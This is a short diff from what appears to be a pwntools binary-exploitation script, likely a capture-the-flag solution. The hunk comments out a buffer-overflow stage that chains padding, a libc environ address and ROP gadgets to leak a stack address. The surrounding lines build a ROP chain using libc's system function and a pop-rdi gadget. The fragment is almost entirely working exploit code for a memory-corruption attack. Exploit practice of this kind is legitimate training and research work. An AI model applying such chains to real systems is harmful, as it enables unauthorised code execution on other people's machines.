@@ -97,16 +97,16 @@ payload += p64(libc.symbols['system'])
 sl(payload)
 '''
 
-environ = p64(libc.address + 0x222200)
-payload = (0x10*b"a" + environ + ret + readgad + 
-           0x10*b"a" + p64(0xdeadbeef) + main)
-sl(payload)
-rl()
-rl()
+# environ = p64(libc.address + 0x222200)
+# payload = (0x10*b"a" + environ + ret + readgad + 
+#            0x10*b"a" + p64(0xdeadbeef) + main)
+# sl(payload)
+# rl()
+# rl()
 
-# GETTING STACK LEAK
-stack = u64(re(6).ljust(8,b"\x00"))
-ic(hex(stack))
+# # GETTING STACK LEAK
+# stack = u64(re(6).ljust(8,b"\x00"))
+# ic(hex(stack))
 
 #===============================================
 poprdi  = libc.address + 0x2a3e5
